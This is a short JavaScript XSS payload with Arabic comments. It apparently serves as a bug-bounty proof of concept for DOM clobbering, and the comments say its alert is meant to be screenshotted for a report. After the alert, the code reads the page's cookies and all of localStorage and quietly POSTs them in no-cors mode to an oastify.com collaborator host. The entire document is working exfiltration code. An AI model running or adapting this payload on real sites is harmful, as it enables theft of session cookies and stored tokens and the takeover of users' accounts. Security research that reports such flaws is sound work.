// 1. إثبات التنفيذ (عشان نصور بيها الريبورت)
alert("DOM Clobbering XSS by Hussein on: " + document.domain);

// 2. استخراج الكوكيز والـ Local Storage
var userCookies = document.cookie;
var userStorage = JSON.stringify(localStorage);

// 3. تجميع الداتا كنص عادي (من غير btoa عشان نتجنب إيرور الحروف)
var exfilData = "===== COOKIES =====\n" + userCookies + "\n\n===== LOCAL STORAGE =====\n" + userStorage;

// 4. إرسال الداتا في الخفاء باستخدام POST Request
fetch("https://2nqfrsyf5u919k496pa4iwbu9lfc33rs.oastify.com/", {
    method: "POST",       // استخدام POST عشان الداتا الكبيرة
    mode: "no-cors",      // تخطي إيرور الـ CORS
    body: exfilData       // حط الداتا كلها هنا
});
